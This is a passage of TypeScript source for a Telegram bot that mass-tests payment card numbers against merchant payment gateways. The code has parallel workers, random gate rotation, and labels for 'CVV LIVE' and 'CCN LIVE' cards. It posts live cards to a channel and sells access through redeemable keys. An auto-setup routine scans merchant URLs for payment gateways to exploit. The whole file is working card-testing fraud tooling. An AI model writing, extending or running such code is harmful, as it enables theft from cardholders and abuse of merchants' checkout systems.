      // rejecting the whole batch when it exceeds what's left for today, trim it
      // to the remaining allowance so the run still produces results.
      if (!hasAdminAccess) {
        const remaining = botUser.dailyLimit - botUser.usageToday;
        if (remaining <= 0) {
          bot?.sendMessage(chatId, "⚠️ Daily check limit reached — try again tomorrow.");
          return;
        }
        if (count > remaining) {
          lines = lines.slice(0, remaining);
          count = remaining;
          bot?.sendMessage(chatId, `⚠️ Trimmed to your remaining *${remaining}* check(s) for today.`, { parse_mode: "Markdown" });
        }
      }

      const activeGate = gateOverride || await getGateForUser(telegramId);
      if (!activeGate) {
        bot?.sendMessage(chatId, "⚠️ No active gate.");
        return;
      }

      const isRandom = !gateOverride && hasAdminAccess && (userRandomGate.get(telegramId) ?? false);
      const isAutoRoute = !gateOverride && hasAdminAccess && (userAutoRoute.get(telegramId) ?? false);
      // When the run rotates gates per-card, show that honestly in the header
      // instead of pinning the pre-loop fallback gate's name. Earlier UI
      // displayed `activeGate.name` even when isRandom was true, making the
      // run look single-gate when it was actually rotating.
      const allActiveCount = (isRandom || isAutoRoute)
        ? (await storage.getGateConfigs()).filter(g => g.active && g.gateType !== "unsupported").length
        : 0;
      const displayGateName = isRandom    ? `🎲 Random (${allActiveCount} gates)`
                            : isAutoRoute ? `🧭 Auto-route (${allActiveCount} gates)`
                            : (hasAdminAccess ? activeGate.name : maskGateName(activeGate.name));
      // Per-card gates-used tally so the final summary lists which gates the
      // run actually rotated through (proves random is rotating + helps
      // operator spot a gate that's dominating).
      const gatesUsedTally = new Map<string, number>();

      // Read mass-check settings: parallel workers + velocity/dedup guard.
      const globalSettings = await storage.getBotSettings().catch(() => null);
      const massWorkers   = Math.min(Math.max(globalSettings?.massWorkers   ?? 1, 1), 8);
      const massDedup     = globalSettings?.massDedup     ?? true;
      const velocityMins  = globalSettings?.massVelocityMins ?? 15;
      const velocityMs    = velocityMins * 60_000;

      // Step 1: Dedup by PAN within this batch + prune stale velocity entries.
      let dupCount = 0;
      if (massDedup) {
        pruneOld(velocityMs);
        const deduped = dedupCardList(lines);
        dupCount = deduped.dupeCount;
        lines = deduped.unique;
        count = lines.length;
        if (dupCount > 0)
          bot?.sendMessage(chatId, `⚠️ Removed *${dupCount}* duplicate card(s) from batch.`, { parse_mode: "Markdown" });
      }

      // Step 2: Velocity filter — skip cards checked recently across all runs.
      let velocitySkipped = 0;
      if (massDedup) {
        const fresh: string[] = [];
        for (const line of lines) {
          const v = checkVelocity(line, velocityMs);
          if (v.blocked) { velocitySkipped++; }
          else fresh.push(line);
        }
        lines = fresh;
        count = lines.length;
        if (velocitySkipped > 0)
          bot?.sendMessage(chatId, `⚠️ Skipped *${velocitySkipped}* card(s) checked in the last ${velocityMins}m (velocity guard).`, { parse_mode: "Markdown" });
      }

      if (count === 0) {
        bot?.sendMessage(chatId, "ℹ️ No new cards to check after dedup/velocity filter.");
        return;
      }

      // Clear any stale stop flag from a previous run by this admin.
      massStopRequested.delete(telegramId);

      const stopKeyboard = { inline_keyboard: [[{ text: "🛑 STOP", callback_data: `mass_stop_${telegramId}` }]] };
      const workerLabel = massWorkers > 1 ? ` · ⚡ ${massWorkers}× parallel` : "";
      const progressMsg = await bot?.sendMessage(chatId, `⏳ *Mass Check Starting*\n━━━━━━━━━━━━━━━━━━━━\n*Cards:* ${count}\n*Gate:* ${tgEscape(displayGateName)}${workerLabel}\n\n\`${buildProgressBar(0, count)}\` 0/${count}\n*ETA:* Calculating...\n\nTap STOP to halt at the current card.`, { parse_mode: "Markdown", reply_markup: stopKeyboard });
      const progressMsgId = progressMsg?.message_id;

      let lives = 0, deads = 0;
      let stopped = false;
      const liveCards: string[] = [];
      const deadCards: string[] = [];
      const latencies: number[] = [];
      const declineTally = new Map<string, number>();
      const livePlain: string[] = [];
      const deadPlain: string[] = [];
      let cursor = 0;
      let done = 0;
      let lastProgressUpdate = 0;

      // Promise-pool: N workers pull cards from a shared cursor.
      // JS is single-threaded — array mutations are safe without locks.
      const worker = async () => {
        while (true) {
          if (massStopRequested.has(telegramId)) { stopped = true; return; }
          const i = cursor++;
          if (i >= count) return;
          const line = lines[i];

          const card = parseCard(line);
          if (!card) {
            deadCards.push(`⚠️ \`${tgEscape(line.substring(0, 25))}...\` — Invalid format`);
            deadPlain.push(`${line} | INVALID FORMAT`);
            declineTally.set("Invalid format", (declineTally.get("Invalid format") || 0) + 1);
            deads++;
            done++;
            continue;
          }

          const gate = (isAutoRoute || isRandom) ? await getGateForUser(telegramId, line) : activeGate;
          const usedGate = gate || activeGate;
          const result = await realCheck(line, usedGate);
          const cardFull = fullCardStr(card);
          latencies.push(result.latency);
          // Tally which gate handled this card (rotation visibility).
          if (usedGate?.name) gatesUsedTally.set(usedGate.name, (gatesUsedTally.get(usedGate.name) || 0) + 1);

          // Record this PAN in the velocity guard after a real gate hit.
          if (massDedup) recordCheck(line);

          await storage.createCheckResult({
            card: cardFull,
            status: result.status === "approved" ? "approved" : "declined",
            response: result.response,
            gate: (gate || activeGate).name,
            latency: result.latency,
            checkedBy: telegramId,
          });

          const parts = parseRichResponse(result.response);
          const headline = parts.headline;

          if (result.status === "approved") {
            lives++;
            const isCvv = /CVV LIVE/i.test(headline);
            const isCcn = /CCN LIVE/i.test(headline);
            const isTok = parts.isTokenOnly || /TOKENIZED|TOKEN/i.test(headline);
            const icon = isCvv ? "🟢" : isCcn ? "🟡" : isTok ? "🔵" : "✅";
            const label = isCvv ? "CVV LIVE" : isCcn ? "CCN LIVE" : isTok ? "TOKEN" : "LIVE";
            // When running random/auto-route, prepend the gate name to each
            // live entry so the operator can verify rotation actually happened
            // (e.g. `[GateA] ✅ VISA …` vs the same gate name on every line).
            const detailBits = [parts.cardInfo, parts.bankName, parts.amount, parts.address].filter(Boolean).map(tgEscape);
            const shownCard = isMaskEnabled() ? maskCardLine(cardFull) : cardFull;
            const gateTag = (isRandom || isAutoRoute) && usedGate?.name ? ` [${tgEscape(usedGate.name)}]` : "";
            liveCards.push(`${icon} \`${shownCard}\` — *${label}*${gateTag}${detailBits.length ? ` · ${detailBits.join(" · ")}` : ""}`);
            livePlain.push(`${shownCard} | ${label}${(isRandom||isAutoRoute) && usedGate?.name ? ` | ${usedGate.name}` : ""}${parts.cardInfo ? ` | ${parts.cardInfo}` : ""}${parts.bankName ? ` | ${parts.bankName}` : ""}${parts.amount ? ` | ${parts.amount}` : ""}${parts.address ? ` | ${parts.address}` : ""}`);
            notifyLiveCardToChannel(cardFull, result, usedGate.name, telegramId, usedGate.id);
          } else {
            deads++;
            const reason = (parts.declineCode || headline.replace(/DECLINED\s*✗?\s*/i, "").trim()) || "Declined";
            declineTally.set(reason, (declineTally.get(reason) || 0) + 1);
            const detail = parts.cardInfo ? ` · ${tgEscape(parts.cardInfo)}` : "";
            const shownCard = isMaskEnabled() ? maskCardLine(cardFull) : cardFull;
            const gateTag = (isRandom || isAutoRoute) && usedGate?.name ? ` [${tgEscape(usedGate.name)}]` : "";
            deadCards.push(`❌ \`${shownCard}\` —${gateTag} ${tgEscape(reason)}${detail}`);
            deadPlain.push(`${shownCard} | ${reason}${(isRandom||isAutoRoute) && usedGate?.name ? ` | ${usedGate.name}` : ""}${parts.cardInfo ? ` | ${parts.cardInfo}` : ""}`);
          }

          done++;
          // Throttle progress edits: update every 3 completions, max once per 2s
          // (Telegram rate-limit is ~20 edits/min per message).
          const now = Date.now();
          if (progressMsgId && done % 3 === 0 && now - lastProgressUpdate > 2000) {
            lastProgressUpdate = now;
            const avgLat = latencies.length > 0 ? latencies.reduce((a, b) => a + b, 0) / latencies.length : 5000;
            const remaining = count - done;
            const etaMs = remaining * (avgLat / massWorkers);
            const etaStr = etaMs >= 60000 ? `${Math.ceil(etaMs / 60000)}m` : `${Math.ceil(etaMs / 1000)}s`;
            const pct = Math.round((done / count) * 100);
            bot?.editMessageText(
              `⏳ *Mass Check In Progress*\n━━━━━━━━━━━━━━━━━━━━\n*Gate:* ${tgEscape(displayGateName)}${workerLabel}\n\n\`${buildProgressBar(done, count)}\` ${done}/${count} (${pct}%)\n✅ *${lives}* | ❌ *${deads}*\n*ETA:* ~${etaStr}\n━━━━━━━━━━━━━━━━━━━━`,
              { chat_id: chatId, message_id: progressMsgId, parse_mode: "Markdown", reply_markup: stopKeyboard }
            ).catch(() => {});
          }
        }
      };

      await Promise.all(Array.from({ length: massWorkers }, () => worker()));

      // Clear the flag in case the loop exited without consuming it (e.g.
      // natural completion after a late tap that didn't break the loop in time).
      massStopRequested.delete(telegramId);

      const checkedCount = lives + deads;
      await storage.updateBotUser(botUser.id, {
        usageToday: botUser.usageToday + checkedCount,
        totalChecks: botUser.totalChecks + checkedCount,
        totalHits: botUser.totalHits + lives,
      });

      const hitRatePct = checkedCount > 0 ? (lives / checkedCount) * 100 : 0;
      const hitRate = hitRatePct.toFixed(1);
      const hitRateIcon = hitRatePct >= 5 ? "🔥" : hitRatePct >= 1 ? "✨" : hitRatePct > 0 ? "💧" : "❄️";
      const totalTime = latencies.reduce((a, b) => a + b, 0);
      const totalTimeStr = totalTime >= 60000 ? `${(totalTime / 60000).toFixed(1)}m` : `${(totalTime / 1000).toFixed(1)}s`;
      const avgLatencyStr = latencies.length > 0
        ? (() => {
            const avg = totalTime / latencies.length;
            return avg >= 1000 ? `${(avg / 1000).toFixed(1)}s` : `${Math.round(avg)}ms`;
          })()
        : "—";
      const cvvLives = liveCards.filter(c => /CVV LIVE/i.test(c)).length;
      const ccnLives = liveCards.filter(c => /CCN LIVE/i.test(c)).length;
      const tokenLives = liveCards.filter(c => /TOKEN/i.test(c)).length;
      const chargedLives = lives - cvvLives - ccnLives - tokenLives; // full ✅ charges

      // Header block — shared by every variant of the summary.
      const header = () => {
        let h = `${stopped ? "🛑 *Mass Check Stopped*" : "📊 *Mass Check Complete*"}\n━━━━━━━━━━━━━━━━━━━━\n`;
        if (stopped) h += `_Halted — ${count - checkedCount} card(s) not processed._\n\n`;
        h += `*Checked:* ${checkedCount}/${count}\n`;
        h += `${hitRateIcon} *Hit Rate:* ${hitRate}%\n`;
        h += `*Live:* ${lives}  (${chargedLives}✅ ${cvvLives}🟢 ${ccnLives}🟡 ${tokenLives}🔵)\n`;
        h += `*Dead:* ${deads}❌\n`;
        h += `⏱ *Total:* ${totalTimeStr}   *Avg:* ${avgLatencyStr}/card\n`;
        h += `🎯 *Gate:* ${tgEscape(displayGateName)}\n`;
        // Rotation visibility: when random/auto-route was on, list the actual
        // gates that handled cards + count each. Operator can now verify the
        // run rotated (e.g. "GateA: 12 · GateB: 8 · GateC: 10") instead of
        // assuming "only one gate is being used."
        if ((isRandom || isAutoRoute) && gatesUsedTally.size > 0) {
          const sorted = [...gatesUsedTally.entries()].sort((a, b) => b[1] - a[1]);
          const formatted = sorted.map(([n, c]) => `${tgEscape(n)} ×${c}`).join(" · ");
          h += `🔀 *Gates Used (${gatesUsedTally.size}):* ${formatted}\n`;
        }
        return h;
      };

      // Decline breakdown — top reasons, sorted by frequency. Gives the admin a
      // read on *why* a batch died (gate dead vs. bad cards vs. proxy issues).
      const declineBlock = () => {
        if (declineTally.size === 0) return "";
        const top = [...declineTally.entries()].sort((a, b) => b[1] - a[1]).slice(0, 6);
        let b = `\n*📉 Decline Breakdown:*\n`;
        for (const [reason, n] of top) b += `• ${tgEscape(reason)} — *${n}*\n`;
        const shown = top.reduce((s, [, n]) => s + n, 0);
        if (deads - shown > 0) b += `• _…+${deads - shown} other_\n`;
        return b;
      };

      let summary = header();
      summary += declineBlock();
      summary += `\n`;

      if (liveCards.length > 0) {
        const maxLives = Math.min(liveCards.length, 25);
        summary += `*🟢 LIVE CARDS:*\n${liveCards.slice(0, maxLives).join("\n")}`;
        if (liveCards.length > maxLives) summary += `\n_…+${liveCards.length - maxLives} more (see attached file)_`;
        summary += `\n\n`;
      }
      if (deadCards.length > 0) {
        const maxDeads = Math.min(deadCards.length, 10);
        summary += `*🔴 DEAD CARDS:*\n${deadCards.slice(0, maxDeads).join("\n")}`;
        if (deadCards.length > maxDeads) summary += `\n_…+${deadCards.length - maxDeads} more_`;
      }
      summary += `\n━━━━━━━━━━━━━━━━━━━━`;

      // If we'd overflow Telegram's 4096-char limit, fall back to a compact
      // summary and rely on the attached results file for the full detail.
      if (summary.length > 4000) {
        summary = header() + declineBlock() + `\n`;
        if (liveCards.length > 0) {
          const n = Math.min(liveCards.length, 15);
          summary += `*🟢 LIVE CARDS:*\n${liveCards.slice(0, n).join("\n")}`;
          if (liveCards.length > n) summary += `\n_…+${liveCards.length - n} more (see attached file)_`;
          summary += `\n`;
        }
        summary += `\n_Full results attached as a file._\n━━━━━━━━━━━━━━━━━━━━`;
      }

      // Bulletproof delivery: try Markdown (edit, then send), and if Telegram
      // still rejects the entities, send a plain-text copy so the result is
      // NEVER silently lost to a parse error.
      const deliver = async () => {
        if (progressMsgId) {
          try {
            await bot?.editMessageText(summary, { chat_id: chatId, message_id: progressMsgId, parse_mode: "Markdown" });
            return;
          } catch { /* fall through to fresh sends */ }
        }
        try {
          await bot?.sendMessage(chatId, summary, { parse_mode: "Markdown" });
        } catch {
          // Last resort: drop bold/code markers and un-escape the rest, then
          // send WITHOUT parse_mode so no entity parsing can fail. Underscores
          // are kept (they're content in decline codes like do_not_honor).
          const plain = summary
            .replace(/\\([_*`\[\]])/g, "$1") // un-escape
            .replace(/[`*]/g, "");           // drop bold/code markers, keep _
          try { await bot?.sendMessage(chatId, plain); } catch (e) {
            console.error("[mass] summary delivery failed:", e);
          }
        }
      };
      await deliver();

      // Attach a full results file for non-trivial runs or when the inline list
      // was truncated — admins want the complete live + dead set to save/export.
      const shouldAttach = checkedCount > 25 || liveCards.length > 25 || deadCards.length > 10;
      if (shouldAttach && (livePlain.length || deadPlain.length)) {
        try {
          const ts = new Date().toISOString().replace(/[:.]/g, "-");
          const fileBody =
            `# Mass Check Results — ${displayGateName}\n` +
            `# ${new Date().toLocaleString()}\n` +
            `# Checked ${checkedCount}/${count} · Live ${lives} · Dead ${deads} · Hit ${hitRate}%\n\n` +
            `=== LIVE (${livePlain.length}) ===\n${livePlain.join("\n") || "(none)"}\n\n` +
            `=== DEAD (${deadPlain.length}) ===\n${deadPlain.join("\n") || "(none)"}\n`;
          const buf = Buffer.from(fileBody, "utf8");
          await bot?.sendDocument(chatId, buf, {}, { filename: `mass_results_${ts}.txt`, contentType: "text/plain" });
        } catch (e) {
          console.error("[mass] results file attach failed:", e);
        }
      }
    }

    bot.onText(/^\/mass(?:@\w+)?\s*$/, async (msg) => {
      if (!isFeatureEnabled("mass")) { bot?.sendMessage(msg.chat.id, "🚫 /mass is currently disabled by the owner."); return; }
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!botUser || botUser.banned) {
        bot?.sendMessage(chatId, "❌ Access denied.");
        return;
      }

      const hasAdminAccess = await checkAdmin(telegramId, botUser);

      if (!hasAdminAccess && !botUser.keyId) {
        bot?.sendMessage(chatId, "🔑 Redeem an access key first: `/redeem H0-XXXX-XXXX-XXXX`", { parse_mode: "Markdown" });
        return;
      }

      if (!hasAdminAccess && botUser.keyId) {
        const key = await storage.getAccessKeyById(botUser.keyId);
        if (key && key.expiresAt && new Date(key.expiresAt) < new Date()) {
          bot?.sendMessage(chatId, "⚠️ Your access key has expired. Redeem a new one: `/redeem KEY`", { parse_mode: "Markdown" });
          return;
        }
      }

      {
        bot?.sendMessage(chatId, `📋 Send cards now (one per line, or upload a .txt file)\nFormat: \`CC|MM|YYYY|CVV\`\nMax this batch: *${getMaxCards(hasAdminAccess)}* card(s)`, { parse_mode: "Markdown" });
      }

      const listener = async (reply: TelegramBot.Message) => {
        if (reply.chat.id !== chatId || !reply.text) return;
        // Ignore other slash-commands so e.g. typing /help while waiting
        // doesn't get swallowed as "cards".
        if (reply.text.trim().startsWith("/")) return;
        bot?.removeListener("message", listener);

        // Robust parse — same helper the .txt-upload path uses. Handles |, :,
        // ;, comma, space, tab delimiters, embedded text, and Luhn-validates.
        const allCards = parseCardsBlob(reply.text);
        const maxCards = getMaxCards(hasAdminAccess);
        const count = Math.min(allCards.length, maxCards);

        if (count === 0) {
          bot?.sendMessage(chatId,
            "❌ No valid cards found.\n\nExpected one card per line as `PAN|MM|YYYY|CVV` (also accepts `:` `;` `,` or space). Example:\n`4111111111111111|12|2027|123`",
            { parse_mode: "Markdown" });
          return;
        }

        const cardLines = allCards.slice(0, count);
        const capNote = allCards.length > maxCards ? ` (capped at ${maxCards}; you sent ${allCards.length})` : "";
        if (capNote) bot?.sendMessage(chatId, `📋 *${count}* cards queued${capNote}`, { parse_mode: "Markdown" });

        if (hasAdminAccess) {
          const allGates = await storage.getGateConfigs();
          const activeGates = allGates.filter(g => g.active);
          if (activeGates.length > 1) {
            pendingMassChecks.set(telegramId, { cards: cardLines });
            const keyboard = activeGates.map(g => [{
              text: `${g.name} (${g.gateType.toUpperCase()})`,
              callback_data: `massgate_${g.id}`,
            }]);
            keyboard.push([{ text: "🎲 Random Gate", callback_data: "massgate_random" }]);
            keyboard.push([{ text: "📌 Current Default", callback_data: "massgate_default" }]);
            bot?.sendMessage(chatId, `🔧 *Select gate for ${count} cards:*`, {
              parse_mode: "Markdown",
              reply_markup: { inline_keyboard: keyboard },
            });
            return;
          }
        }

        await executeMassCheck(chatId, telegramId, cardLines);
      };

      bot?.on("message", listener);
      setTimeout(() => { bot?.removeListener("message", listener); }, 120000);
    });

    // ── /editgate value capture — consume plain-text messages from admins
    //     who tapped a text/number/csv field button. Must register BEFORE the
    //     document handler so it can opt-out cleanly for non-text messages.
    bot.on("message", async (msg) => {
      try {
      if (!msg.text || msg.text.startsWith("/")) return; // commands handled elsewhere
      const telegramId = msg.from?.id?.toString() || "";
      if (gateSetupCtx.has(telegramId)) return; // addgate wizard is active — let it handle this message
      const ctx = editContext.get(telegramId);
      if (!ctx) return;

      // ── Find-field search capture ─────────────────────────────────────────
      if (ctx.awaitingSearch) {
        const botUserSearch = await storage.getBotUser(telegramId);
        if (!await checkAdmin(telegramId, botUserSearch)) return;
        const searchChatId = ctx.awaitingSearch.chatId;
        const searchMsgId  = ctx.awaitingSearch.messageId;
        const query = msg.text.trim();
        ctx.awaitingSearch = undefined;
        editContext.set(telegramId, ctx);
        const gate = await storage.getGateConfig(ctx.gateId);
        if (!gate) { bot?.sendMessage(msg.chat.id, "❌ Gate not found — re-run /editgate"); return; }
        const rendered = renderFieldSearch(gate, query);
        bot?.editMessageText(rendered.text, {
          chat_id: searchChatId, message_id: searchMsgId, parse_mode: "Markdown",
          reply_markup: { inline_keyboard: rendered.keyboard },
        }).catch(() => bot?.sendMessage(msg.chat.id, rendered.text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } }));
        return;
      }

      if (!ctx.awaiting) return; // not in awaiting state
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) return;
      const { category, field: fieldKey, type } = ctx.awaiting;
      const field = findField(category, fieldKey);
      if (!field) { ctx.awaiting = undefined; return; }
      const raw = msg.text.trim();
      if (field.topLevel && REQUIRED_TOP_LEVEL.has(field.key) && !raw) {
        bot?.sendMessage(msg.chat.id, `❌ *${field.label}* can't be empty — tap Clear isn't allowed for required fields.`, { parse_mode: "Markdown" });
        return;
      }
      let value: any = raw;
      if (type === "number") {
        const n = parseInt(raw, 10);
        if (Number.isNaN(n)) {
          bot?.sendMessage(msg.chat.id, `❌ Not a number: \`${raw}\``, { parse_mode: "Markdown" });
          return;
        }
        value = n;
      } else if (type === "csv") {
        value = raw.split(",").map(s => s.trim()).filter(Boolean);
      }
      try {
        await setFieldValue(ctx.gateId, field, value);
        const awaitingChatId = ctx.awaiting.chatId;
        const awaitingMsgId  = ctx.awaiting.messageId;
        ctx.awaiting = undefined;
        editContext.set(telegramId, ctx);
        const refreshed = await storage.getGateConfig(ctx.gateId);
        const rendered = refreshed ? renderFieldList(refreshed, category) : null;
        if (rendered && awaitingChatId && awaitingMsgId) {
          // Edit the existing prompt message in-place instead of cluttering chat
          bot?.editMessageText(rendered.text, { chat_id: awaitingChatId, message_id: awaitingMsgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } }).catch(() => {
            bot?.sendMessage(msg.chat.id, rendered.text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } });
          });
        } else if (rendered) {
          bot?.sendMessage(msg.chat.id, rendered.text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } });
        } else {
          bot?.sendMessage(msg.chat.id, `✅ ${field.label} set.`);
        }
      } catch (e: any) {
        bot?.sendMessage(msg.chat.id, `❌ Save failed: ${e.message}`);
      }
      } catch (outer: any) {
        // Top-level safety net so an admin's stray message can never crash the bot.
        console.error("[editgate-capture] failed:", outer);
      }
    });

    // ── /addgate value capture — consumes plain-text messages during setup flow
    bot.on("message", async (msg) => {
      try {
        if (!msg.text || msg.text.startsWith("/")) return;
        const telegramId = msg.from?.id?.toString() || "";
        const ctx = gateSetupCtx.get(telegramId);
        if (!ctx) return;
        const chatId = msg.chat.id;
        const botUser = await storage.getBotUser(telegramId);
        if (!await checkAdmin(telegramId, botUser)) return;
        const text = msg.text.trim();

        // ── AUTO mode: waiting for a single URL ────────────────────────────
        if (ctx.mode === "auto" && ctx.step === "await_url") {
          ctx.url = text;
          ctx.step = "detecting";
          const statusMsg = await bot!.sendMessage(chatId, `🔍 Detecting \`${text.slice(0, 50)}\`…`, { parse_mode: "Markdown" });
          try {
            const detection = await detectGateFromUrl(text);
            ctx.detection = detection;
            if (detection.gateType === "unknown") {
              bot?.editMessageText(`❌ No payment gateway detected on \`${text.slice(0, 50)}\`\nTry Manual setup instead.`, {
                chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown",
                reply_markup: { inline_keyboard: [[{ text: "✏️ Manual Setup", callback_data: "gs_manual" }, { text: "✖️ Cancel", callback_data: "gs_cancel" }]] },
              }).catch(() => {});
              // Clear ctx so the user isn't trapped — without this, gateSetupCtx
              // would persist forever in "failed" state, and the editgate message
              // handler's `if (gateSetupCtx.has(...)) return` would silently
              // swallow every future text message until restart.
              gateSetupCtx.delete(telegramId);
              return;
            }
            const gateName = autoGateName(detection.gateType, detection.siteUrl || text);
            ctx.name = gateName;
            const preview = gsPreview(ctx, gateName);
            ctx.step = "confirm_auto";
            bot?.editMessageText(`✅ *Gate Detected*\n━━━━━━━━━━━━━━━━━━━━\n${preview}`, {
              chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown",
              reply_markup: { inline_keyboard: [
                [{ text: "✅ Save Gate", callback_data: "gs_save_auto" }, { text: "⚙️ Save & Configure", callback_data: "gs_save_auto_edit" }],
                [{ text: "✖️ Cancel", callback_data: "gs_cancel" }],
              ]},
            }).catch(() => {});
          } catch (e: any) {
            bot?.editMessageText(`❌ Detection error: ${e.message?.slice(0, 80)}`, {
              chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown",
            }).catch(() => {});
            gateSetupCtx.delete(telegramId);
          }
          return;
        }

        // ── MASS mode: waiting for multi-line URL list ──────────────────────
        if (ctx.mode === "mass" && ctx.step === "await_urls") {
          const urls = text.split(/[\n,]+/).map(u => u.trim()).filter(u => u.length > 3);
          if (urls.length === 0) { bot?.sendMessage(chatId, "⚠️ No valid URLs found."); return; }
          // Mark this admin's mass run so a Stop button can interrupt it.
          // We replace ctx instead of deleting so massStopRequested can use the
          // same telegramId key without colliding with a fresh /addgate invocation.
          gateSetupCtx.set(telegramId, { mode: "mass", step: "running", chatId: chatId });
          const progMsg = await bot!.sendMessage(chatId, `📡 Processing *${urls.length}* URLs…`, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: [[{ text: "🛑 Stop", callback_data: `gs_mass_stop_${telegramId}` }]] },
          });
          let ok = 0, fail = 0, done = 0;
          const CONCURRENCY = 4;
          let stopped = false;

          // Simple promise-pool: 4 workers pulling from a shared cursor.
          // Cuts a 30-URL batch from ~5 min sequential to ~1 min wall time
          // since each detectGateFromUrl is mostly I/O wait on HTTP fetches.
          let cursor = 0;
          const worker = async () => {
            while (!stopped) {
              const i = cursor++;
              if (i >= urls.length) return;
              const u = urls[i];
              try {
                const detection = await detectGateFromUrl(u);
                if (detection.gateType !== "unknown") {
                  const gateName = autoGateName(detection.gateType, detection.siteUrl || u);
                  await storage.createGateConfig({ name: gateName, gateType: detection.gateType, subType: detection.subType, url: detection.siteUrl, active: true, settings: detection.settings });
                  ok++;
                } else { fail++; }
              } catch { fail++; }
              done++;
              // Refresh progress at most every 2 completions to avoid Telegram rate-limits
              if (done % 2 === 0 || done === urls.length) {
                bot?.editMessageText(
                  `📡 *Mass Setup* [${done}/${urls.length}]\n✅ ${ok} saved · ❌ ${fail} failed`,
                  { chat_id: chatId, message_id: progMsg.message_id, parse_mode: "Markdown",
                    reply_markup: stopped ? undefined : { inline_keyboard: [[{ text: "🛑 Stop", callback_data: `gs_mass_stop_${telegramId}` }]] },
                  }
                ).catch(() => {});
              }
              // Honor stop-request on each iteration
              if (massStopRequested.has(telegramId)) { stopped = true; return; }
            }
          };
          await Promise.all(Array.from({ length: CONCURRENCY }, () => worker()));
          gateSetupCtx.delete(telegramId);
          massStopRequested.delete(telegramId);
          const verb = stopped ? "Stopped" : "Done";
          bot?.sendMessage(chatId, `🏁 *${verb}!* ${ok} gates configured, ${fail} failed.\nUse /gates to view.`, { parse_mode: "Markdown" });
          await storage.createSystemLog({ level: "SUCCESS", message: `Telegram mass gate setup: ${ok}/${urls.length} configured${stopped ? " (stopped)" : ""}`, source: "telegram" });
          return;
        }

        // ── MANUAL mode step machine — all input edits the wizard in-place ────
        if (ctx.mode === "manual") {
          if (ctx.step === "await_url") {
            if (!text.startsWith("http://") && !text.startsWith("https://")) {
              bot?.sendMessage(chatId, `⚠️ Please send a full URL starting with \`https://\``, { parse_mode: "Markdown" });
              return;
            }
            ctx.url = text;
            ctx.step = "confirm_url";
            await gsEditWizard(chatId, telegramId, ctx);
            return;
          }
          if (ctx.step === "await_key") {
            if (ctx.gateType === "braintree") ctx.btClientToken = text;
            else ctx.publicKey = text;
            ctx.step = "confirm_key";
            await gsEditWizard(chatId, telegramId, ctx);
            return;
          }
          if (ctx.step === "await_name") {
            ctx.name = text.trim() || gsAutoName(ctx);
            ctx.step = "review";
            await gsEditWizard(chatId, telegramId, ctx);
            return;
          }
        }
      } catch (e: any) {
        console.error("[gatesetup-capture] error:", e);
      }
    });

    bot.on("document", async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const doc = msg.document;
      if (!doc) return;

      // ── JSON gate import — captioned `/importgates` ────────────────────────
      // Format: array of { name, gateType, subType?, url, active?, settings? }
      // (the exact shape /exportgates produces)
      if (doc.file_name?.endsWith(".json")) {
        const botUserJ = await storage.getBotUser(telegramId);
        if (!await checkAdmin(telegramId, botUserJ)) {
          bot?.sendMessage(chatId, "🔒 Admin only — /importgates needs admin access.");
          return;
        }
        const capJ = (msg.caption || "").trim().toLowerCase();
        if (!/^\/?importgates\b/.test(capJ)) {
          bot?.sendMessage(chatId,
            "📦 To import gates from this JSON, add the caption `/importgates` to the file.",
            { parse_mode: "Markdown" });
          return;
        }
        try {
          const link = await bot?.getFileLink(doc.file_id);
          if (!link) throw new Error("could not get file link");
          const resp = await fetch(link);
          if (!resp.ok) throw new Error(`download HTTP ${resp.status}`);
          const text = await resp.text();
          let parsed: any;
          try { parsed = JSON.parse(text); }
          catch (pe: any) { bot?.sendMessage(chatId, `❌ Not valid JSON: ${pe.message?.slice(0, 80)}`); return; }
          const arr = Array.isArray(parsed) ? parsed : (Array.isArray(parsed?.gates) ? parsed.gates : null);
          if (!arr) { bot?.sendMessage(chatId, "❌ Expected a JSON array of gate objects (or `{gates:[...]}`)."); return; }
          let ok = 0, skipped = 0;
          for (const g of arr) {
            if (!g?.name || !g?.gateType || !g?.url) { skipped++; continue; }
            try {
              await storage.createGateConfig({
                name: String(g.name),
                gateType: String(g.gateType).toLowerCase(),
                subType: g.subType || "standard",
                url: String(g.url),
                active: g.active !== false,
                settings: g.settings || {},
              });
              ok++;
            } catch { skipped++; }
          }
          await storage.createSystemLog({ level: "INFO", message: `Imported ${ok} gates from JSON via Telegram (${skipped} skipped)`, source: "telegram" });
          bot?.sendMessage(chatId,
`📥 *Import complete*
✅ ${ok} gates added · ⏭ ${skipped} skipped (missing fields / dup name)
Use /gates to view.`, { parse_mode: "Markdown" });
        } catch (e: any) {
          bot?.sendMessage(chatId, `❌ Import failed: ${e?.message?.slice(0, 120) || "unknown error"}`);
        }
        return;
      }

      if (!doc.file_name?.endsWith(".txt")) return;

      const botUser = await storage.getBotUser(telegramId);
      if (!botUser || botUser.banned) {
        bot?.sendMessage(chatId, "❌ Access denied.");
        return;
      }

      const hasAdminAccess = await checkAdmin(telegramId, botUser);

      if (!hasAdminAccess && !botUser.keyId) {
        bot?.sendMessage(chatId, "🔑 Redeem an access key first: `/redeem H0-XXXX-XXXX-XXXX`", { parse_mode: "Markdown" });
        return;
      }

      if (!hasAdminAccess && botUser.keyId) {
        const key = await storage.getAccessKeyById(botUser.keyId);
        if (key && key.expiresAt && new Date(key.expiresAt) < new Date()) {
          bot?.sendMessage(chatId, "⚠️ Your access key has expired. Redeem a new one: `/redeem KEY`", { parse_mode: "Markdown" });
          return;
        }
      }

      // Caption routing — admins (and key holders) MUST attach a caption to
      // tell the bot what to do with the file. Previously a captionless
      // .txt fell through to mass-check, which surprised users who just
      // wanted to share a card list as a file. Now no-caption = acknowledge
      // and show the available verbs.
      //   /ccex        → extract cards
      //   /binex [6|8] → extract BINs
      //   /mass        → run mass check
